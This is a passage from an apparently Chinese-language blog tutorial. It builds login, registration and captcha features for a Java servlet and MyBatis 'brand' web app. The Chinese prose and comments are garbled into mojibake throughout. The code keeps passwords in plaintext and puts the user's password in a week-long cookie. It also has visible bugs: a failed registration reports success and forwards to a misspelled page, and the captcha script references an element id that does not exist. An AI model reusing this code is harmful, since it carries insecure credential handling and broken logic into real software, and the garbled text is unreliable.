class="hljs-string">&quot;success&quot;</span>)&#123;            _this.dialogUpdateVisible = <span class="hljs-literal">false</span>;            _this.selectAll();            _this.msgbox(<span class="hljs-string">&quot;ä¿®æ”¹æˆåŠŸï¼&quot;</span>);        &#125;    &#125;)&#125;,</code></pre><h2 id="ç™»å½•æ³¨å†ŒåŠŸèƒ½å®ç°"><a href="#ç™»å½•æ³¨å†ŒåŠŸèƒ½å®ç°" class="headerlink" title="ç™»å½•æ³¨å†ŒåŠŸèƒ½å®ç°"></a>ç™»å½•æ³¨å†ŒåŠŸèƒ½å®ç°</h2><h3 id="ç™»å½•åŠŸèƒ½"><a href="#ç™»å½•åŠŸèƒ½" class="headerlink" title="ç™»å½•åŠŸèƒ½"></a>ç™»å½•åŠŸèƒ½</h3><h4 id="åç«¯å®ç°-7"><a href="#åç«¯å®ç°-7" class="headerlink" title="åç«¯å®ç°"></a>åç«¯å®ç°</h4><h5 id="dao-7"><a href="#dao-7" class="headerlink" title="dao"></a>dao</h5><p>åœ¨<code>src/main/java/com/itheima/mapper</code>åˆ›å»º<code>UserMapper</code>æ¥å£</p><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.itheima.mapper;<span class="hljs-keyword">import</span> com.itheima.pojo.User;<span class="hljs-keyword">import</span> org.apache.ibatis.annotations.Insert;<span class="hljs-keyword">import</span> org.apache.ibatis.annotations.Param;<span class="hljs-keyword">import</span> org.apache.ibatis.annotations.Select;<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">UserMapper</span> </span>&#123;    <span class="hljs-comment">/**</span><span class="hljs-comment">     * ç”¨æˆ·ç™»å½•</span><span class="hljs-comment">     * æ£€æŸ¥ç”¨æˆ·åå’Œå¯†ç æ˜¯å¦æ­£ç¡®</span><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> username</span><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> password</span><span class="hljs-comment">     * <span class="hljs-doctag">@return</span></span><span class="hljs-comment">     */</span>    <span class="hljs-meta">@Select(&quot;select * from tb_user where username = #&#123;username&#125; and password = #&#123;password&#125;&quot;)</span>    <span class="hljs-function">User <span class="hljs-title">select</span><span class="hljs-params">(<span class="hljs-meta">@Param(&quot;username&quot;)</span> String username, <span class="hljs-meta">@Param(&quot;password&quot;)</span> String password)</span></span>;&#125;</code></pre><h5 id="service-7"><a href="#service-7" class="headerlink" title="service"></a>service</h5><p>åœ¨<code>src/main/java/com/itheima/service</code>ä¸­åˆ›å»º<code>UserService</code>ç±»</p><pre><code class="hljs java">SqlSessionFactory sqlSessionFactory = SqlSessionFactoryUtils.getSqlSessionFactory();<span class="hljs-comment">/**</span><span class="hljs-comment"> * ç”¨æˆ·ç™»å½•æ–¹æ³•</span><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> username</span><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> password</span><span class="hljs-comment"> * <span class="hljs-doctag">@return</span></span><span class="hljs-comment"> */</span><span class="hljs-function"><span class="hljs-keyword">public</span> User <span class="hljs-title">Login</span><span class="hljs-params">(String username, String password)</span></span>&#123;    SqlSession session = sqlSessionFactory.openSession();    UserMapper mapper = session.getMapper(UserMapper.class);    User user = mapper.select(username, password);    <span class="hljs-keyword">if</span>(user != <span class="hljs-keyword">null</span>)&#123;        <span class="hljs-keyword">return</span> user;    &#125;<span class="hljs-keyword">else</span> &#123;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;    &#125;&#125;</code></pre><h5 id="servlet-7"><a href="#servlet-7" class="headerlink" title="servlet"></a>servlet</h5><p>åœ¨<code>src/main/java/com/itheima/servler/web</code>ä¸­åˆ›å»º<code>LoginServlet</code></p><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.itheima.web.servlet;<span class="hljs-keyword">import</span> com.itheima.pojo.User;<span class="hljs-keyword">import</span> com.itheima.service.UserService;<span class="hljs-keyword">import</span> javax.servlet.ServletException;<span class="hljs-keyword">import</span> javax.servlet.annotation.WebServlet;<span class="hljs-keyword">import</span> javax.servlet.http.*;<span class="hljs-keyword">import</span> java.io.IOException;<span class="hljs-meta">@WebServlet(value = &quot;/login&quot;)</span><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LoginServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">HttpServlet</span> </span>&#123;    <span class="hljs-comment">// å› ä¸ºBrandServiceå¯èƒ½å¤šæ¬¡ç”¨åˆ° æ‰€ä»¥å˜æˆæˆå‘˜å˜é‡ å‡å°‘åˆ›å»ºçš„æ¬¡æ•°</span>    UserService userservice = <span class="hljs-keyword">new</span> UserService();    <span class="hljs-meta">@Override</span>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doGet</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;        System.out.println(<span class="hljs-string">&quot;login&quot;</span>);        <span class="hljs-comment">//è§£å†³POSTè¯·æ±‚ä¸­æ–‡ä¹±ç é—®é¢˜</span>        request.setCharacterEncoding(<span class="hljs-string">&quot;UTF-8&quot;</span>);        String username = request.getParameter(<span class="hljs-string">&quot;username&quot;</span>);        String password = request.getParameter(<span class="hljs-string">&quot;password&quot;</span>);        User user = userservice.Login(username, password);        <span class="hljs-keyword">if</span>(user != <span class="hljs-keyword">null</span>)&#123;            <span class="hljs-comment">// ç™»å½•æˆåŠŸï¼Œé¡µé¢è·³è½¬åˆ°äº† brand.jsp</span>            <span class="hljs-comment">// ä¿å­˜ç”¨æˆ·çš„sessionä¿¡æ¯</span>            <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦å‹¾é€‰è®°ä½å¯†ç </span>            String remember = request.getParameter(<span class="hljs-string">&quot;remember&quot;</span>);            <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;1&quot;</span>.equals(remember))&#123;                Cookie c_username = <span class="hljs-keyword">new</span> Cookie(<span class="hljs-string">&quot;username&quot;</span>, username);                Cookie c_password = <span class="hljs-keyword">new</span> Cookie(<span class="hljs-string">&quot;password&quot;</span>, password);                c_username.setMaxAge(<span class="hljs-number">3600</span>*<span class="hljs-number">24</span>*<span class="hljs-number">7</span>);                c_password.setMaxAge(<span class="hljs-number">3600</span>*<span class="hljs-number">24</span>*<span class="hljs-number">7</span>);                <span class="hljs-comment">// å‘é€Cookie</span>                response.addCookie(c_username);                response.addCookie(c_password);            &#125;            HttpSession session = request.getSession();            session.setAttribute(<span class="hljs-string">&quot;user&quot;</span>, user);            <span class="hljs-comment">// è·å–é¡¹ç›®çš„è™šæ‹Ÿè·¯å¾„</span>            String contextPath = request.getContextPath();            request.getRequestDispatcher( <span class="hljs-string">&quot;/brand.html&quot;</span>).forward(request,response);        &#125;<span class="hljs-keyword">else</span> &#123;            <span class="hljs-comment">// ç™»å½•å¤±è´¥ï¼Œåœ¨é¡µé¢æ˜¾ç¤ºç™»å½•å¤±è´¥çš„æç¤ºä¿¡æ¯</span>            request.setAttribute(<span class="hljs-string">&quot;login_msg&quot;</span>,<span class="hljs-string">&quot;ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯&quot;</span>);            request.getRequestDispatcher(<span class="hljs-string">&quot;/login.jsp&quot;</span>).forward(request,response);        &#125;    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doPost</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;        doGet(request, response);    &#125;&#125;</code></pre><h4 id="å‰ç«¯å®ç°-7"><a href="#å‰ç«¯å®ç°-7" class="headerlink" title="å‰ç«¯å®ç°"></a>å‰ç«¯å®ç°</h4><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;loginDiv&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;height: 350px&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;/brand-case/login&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span><span class="hljs-attr">id</span>=<span class="hljs-string">&quot;form&quot;</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;loginMsg&quot;</span>&gt;</span>LOGIN IN<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;errorMsg&quot;</span>&gt;</span>$&#123;login_msg&#125; $&#123;register_msg&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Username:<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;username&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;username&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;$&#123;cookie.username.value&#125;&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Password:<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;$&#123;cookie.password.value&#125;&quot;</span><span class="hljs-attr">type</span>=<span class="hljs-string">&quot;password&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Remember:<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;remember&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;remember&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;1&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;checkbox&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;subDiv&quot;</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;login up&quot;</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;reset&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;reset&quot;</span>&gt;</span><span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-symbol">&amp;nbsp;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;register.jsp&quot;</span>&gt;</span>æ²¡æœ‰è´¦å·ï¼Ÿ<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></code></pre><h3 id="æ³¨å†ŒåŠŸèƒ½"><a href="#æ³¨å†ŒåŠŸèƒ½" class="headerlink" title="æ³¨å†ŒåŠŸèƒ½"></a>æ³¨å†ŒåŠŸèƒ½</h3><h4 id="åç«¯å®ç°-8"><a href="#åç«¯å®ç°-8" class="headerlink" title="åç«¯å®ç°"></a>åç«¯å®ç°</h4><h5 id="dao-8"><a href="#dao-8" class="headerlink" title="dao"></a>dao</h5><pre><code class="hljs java"><span class="hljs-comment">/**</span><span class="hljs-comment"> * æŸ¥è¯¢æ˜¯å¦å­˜åœ¨ç›¸åŒçš„ç”¨æˆ·å</span><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> username</span><span class="hljs-comment"> * <span class="hljs-doctag">@return</span></span><span class="hljs-comment"> */</span><span class="hljs-meta">@Select(&quot;select * from tb_user where username = #&#123;username&#125;&quot;)</span><span class="hljs-function">User <span class="hljs-title">selectUser</span><span class="hljs-params">(<span class="hljs-meta">@Param(&quot;username&quot;)</span> String username)</span></span>;<span class="hljs-comment">/**</span><span class="hljs-comment"> * ç”¨æˆ·æ³¨å†Œ</span><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> user</span><span class="hljs-comment"> */</span><span class="hljs-meta">@Insert(&quot;insert into tb_user values (null, #&#123;username&#125;, #&#123;password&#125;)&quot;)</span><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">addUser</span><span class="hljs-params">(User user)</span></span>;</code></pre><h5 id="service-8"><a href="#service-8" class="headerlink" title="service"></a>service</h5><pre><code class="hljs java"><span class="hljs-comment">/**</span><span class="hljs-comment"> * æ³¨å†ŒåŠŸèƒ½</span><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> user</span><span class="hljs-comment"> * <span class="hljs-doctag">@return</span></span><span class="hljs-comment"> */</span><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">Register</span><span class="hljs-params">(User user)</span></span>&#123;    SqlSession session = sqlSessionFactory.openSession();    UserMapper mapper = session.getMapper(UserMapper.class);    User u = mapper.selectUser(user.getUsername());    <span class="hljs-keyword">if</span>(u == <span class="hljs-keyword">null</span>)&#123;        mapper.addUser(user);        session.commit();    &#125;    session.commit();    <span class="hljs-keyword">return</span> u == <span class="hljs-keyword">null</span>;&#125;</code></pre><h5 id="servlet-8"><a href="#servlet-8" class="headerlink" title="servlet"></a>servlet</h5><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.itheima.web.servlet;<span class="hljs-keyword">import</span> com.itheima.pojo.User;<span class="hljs-keyword">import</span> com.itheima.service.UserService;<span class="hljs-keyword">import</span> javax.servlet.ServletException;<span class="hljs-keyword">import</span> javax.servlet.annotation.WebServlet;<span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<span class="hljs-keyword">import</span> javax.servlet.http.HttpSession;<span class="hljs-keyword">import</span> java.io.IOException;<span class="hljs-meta">@WebServlet(value = &quot;/register&quot;)</span><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RegisterServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">HttpServlet</span> </span>&#123;    <span class="hljs-comment">// å› ä¸ºUserServiceå¯èƒ½å¤šæ¬¡ç”¨åˆ° æ‰€ä»¥å˜æˆæˆå‘˜å˜é‡ å‡å°‘åˆ›å»ºçš„æ¬¡æ•°</span>    UserService userservice = <span class="hljs-keyword">new</span> UserService();    <span class="hljs-meta">@Override</span>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doGet</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;        <span class="hljs-comment">//è§£å†³POSTè¯·æ±‚ä¸­æ–‡ä¹±ç é—®é¢˜</span>        request.setCharacterEncoding(<span class="hljs-string">&quot;UTF-8&quot;</span>);        String username = request.getParameter(<span class="hljs-string">&quot;username&quot;</span>);        String password = request.getParameter(<span class="hljs-string">&quot;password&quot;</span>);        String checkCode1 = request.getParameter(<span class="hljs-string">&quot;checkCode&quot;</span>);        User user = <span class="hljs-keyword">new</span> User();        user.setUsername(username);        user.setPassword(password);        <span class="hljs-comment">// è·å–ç”Ÿæˆçš„éªŒè¯ç ä¿¡æ¯</span>        HttpSession session = request.getSession();        String checkCode =(String) session.getAttribute(<span class="hljs-string">&quot;checkCode&quot;</span>);        <span class="hljs-comment">// æ¯”è¾ƒç”¨æˆ·è¾“å…¥çš„éªŒè¯ç </span>        <span class="hljs-comment">// ç»†èŠ‚ï¼šcheckCodeä¸ºç¨‹åºä¸­å®šä¹‰çš„å˜é‡ æ¯”è¾ƒæ—¶æ”¾åœ¨å‰é¢ï¼Œå¦åˆ™å¯èƒ½å‡ºç°ç©ºæŒ‡é’ˆé”™è¯¯</span>        <span class="hljs-keyword">if</span>(!checkCode.equals(checkCode1))&#123;            request.setAttribute(<span class="hljs-string">&quot;register_msg&quot;</span>, <span class="hljs-string">&quot;éªŒè¯ç é”™è¯¯ï¼Œè¯·é‡æ–°è¾“å…¥ï¼&quot;</span>);            request.getRequestDispatcher(<span class="hljs-string">&quot;/register.jsp&quot;</span>).forward(request,response);            <span class="hljs-comment">// ç¦æ­¢æ³¨å†Œ</span>            <span class="hljs-keyword">return</span> ;        &#125;        <span class="hljs-keyword">boolean</span> flag = userservice.Register(user);        <span class="hljs-keyword">if</span>(flag)&#123;            request.setAttribute(<span class="hljs-string">&quot;register_msg&quot;</span>,<span class="hljs-string">&quot;æ³¨å†ŒæˆåŠŸï¼Œè¯·ç™»å½•ï¼&quot;</span>);            request.getRequestDispatcher(<span class="hljs-string">&quot;/login.jsp&quot;</span>).forward(request,response);        &#125;<span class="hljs-keyword">else</span>&#123;            request.setAttribute(<span class="hljs-string">&quot;register_msg&quot;</span>,<span class="hljs-string">&quot;æ³¨å†ŒæˆåŠŸï¼Œè¯·é‡è¯•ï¼&quot;</span>);            request.getRequestDispatcher(<span class="hljs-string">&quot;/regsiter.jsp&quot;</span>).forward(request,response);        &#125;    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doPost</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;        doGet(request, response);    &#125;&#125;</code></pre><h4 id="å‰ç«¯å®ç°-8"><a href="#å‰ç«¯å®ç°-8" class="headerlink" title="å‰ç«¯å®ç°"></a>å‰ç«¯å®ç°</h4><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-div&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;reg-content&quot;</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>æ¬¢è¿æ³¨å†Œ<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>å·²æœ‰å¸å·ï¼Ÿ<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;login.jsp&quot;</span>&gt;</span>ç™»å½•<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;reg-form&quot;</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;/register&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">table</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>ç”¨æˆ·å<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;inputs&quot;</span>&gt;</span>                    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;username&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;username&quot;</span>&gt;</span>                    <span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span>                    <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;username_err&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;err_msg&quot;</span>&gt;</span>$&#123;register_msg&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>                <span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>            <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>å¯†ç <span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;inputs&quot;</span>&gt;</span>                    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;password&quot;</span>&gt;</span>                    <span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span>                    <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;password_err&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;err_msg&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;display: none&quot;</span>&gt;</span>å¯†ç æ ¼å¼æœ‰è¯¯<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>                <span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>            <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>éªŒè¯ç <span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;inputs&quot;</span>&gt;</span>                    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;checkCode&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;checkCode&quot;</span>&gt;</span>                    <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;checkCodeImg&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;/checkCode&quot;</span>&gt;</span>                    <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;changeImg&quot;</span>&gt;</span>çœ‹ä¸æ¸…ï¼Ÿ<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>                <span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>            <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>        <span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;buttons&quot;</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;æ³¨ å†Œ&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;reg_btn&quot;</span>&gt;</span>        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">br</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;clear&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">    <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;changeImgg&quot;</span>).onclick = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;</span><span class="javascript">        <span class="hljs-comment">//è·¯å¾„åé¢æ·»åŠ æ—¶é—´æˆ³çš„ç›®çš„æ˜¯é¿å…æµè§ˆå™¨è¿›è¡Œç¼“å­˜é™æ€èµ„æº</span></span><span class="javascript">        <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;checkCodeImg&quot;</span>).src = <span class="hljs-string">&quot;/checkCode?&quot;</span>+<span class="hljs-keyword">new</span> <span class="hljs-built_in">Date</span>().getMilliseconds();</span>    &#125;<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre><h3 id="éªŒè¯ç æ¨¡å—"><a href="#éªŒè¯ç æ¨¡å—" class="headerlink" title="éªŒè¯ç æ¨¡å—"></a>éªŒè¯ç æ¨¡å—</h3><p>å€ŸåŠ©éªŒè¯ç ç”Ÿæˆå·¥å…·</p><p>åœ¨<code>src/main/java/com/itheima/util</code>å¼•å…¥ç”ŸæˆéªŒè¯ç çš„ç±»</p><p>å°†éªŒè¯ç æ˜¾ç¤ºåœ¨é¡µé¢ä¸Š</p><p>åœ¨<code>src/main/java/com/itheima/servler/web</code>åˆ›å»ºCheckCodeServlet</p><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.itheima.web.servlet;<span class="hljs-keyword">import</span> com.itheima.service.BrandService;<span class="hljs-keyword">import</span> com.itheima.util.CheckCodeUtil;<span class="hljs-keyword">import</span> javax.servlet.ServletException;<span class="hljs-keyword">import</span> javax.servlet.ServletOutputStream;<span class="hljs-keyword">import</span> javax.servlet.annotation.WebServlet;<span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<span class="hljs-keyword">import</span> javax.servlet.http.HttpSession;<span class="hljs-keyword">import</span> java.io.IOException;<span class="hljs-meta">@WebServlet(value = &quot;/checkCode&quot;)</span><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CheckCodeServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">HttpServlet</span> </span>&#123;    <span class="hljs-comment">// å› ä¸ºBrandServiceå¯èƒ½å¤šæ¬¡ç”¨åˆ° æ‰€ä»¥å˜æˆæˆå‘˜å˜é‡ å‡å°‘åˆ›å»ºçš„æ¬¡æ•°</span>    <span class="hljs-keyword">private</span> BrandService brandService = <span class="hljs-keyword">new</span> BrandService();    <span class="hljs-meta">@Override</span>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doGet</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;        <span class="hljs-comment">// ç”ŸæˆéªŒè¯ç </span>        <span class="hljs-comment">// è·å–å“åº”è¾“å‡ºæµ</span>        ServletOutputStream os = response.getOutputStream();        <span class="hljs-comment">// ç”ŸæˆéªŒè¯ç å›¾ç‰‡æ˜¾ç¤ºåœ¨jspé¡µé¢ä¸Š</span>        String checkCode = CheckCodeUtil.outputVerifyImage(<span class="hljs-number">100</span>, <span class="hljs-number">50</span>, os, <span class="hljs-number">4</span>);        <span class="hljs-comment">// å°†ç”Ÿæˆçš„éªŒè¯ç ä¿¡æ¯å‘é€åˆ° /register ç”¨äºéªŒè¯ç”¨æˆ·è¾“å…¥çš„éªŒè¯ç æ˜¯å¦æ­£ç¡®</span>        <span class="hljs-comment">// å°†éªŒè¯ç å­˜å…¥session</span>        HttpSession codeSession = request.getSession();        codeSession.setAttribute(<span class="hljs-string">&quot;checkCode&quot;</span>, checkCode);    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doPost</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;        doGet(request, response);    &#125;&#125;</code></pre><h3 id="æƒé™éªŒè¯"><a href="#æƒé™éªŒè¯" class="headerlink" 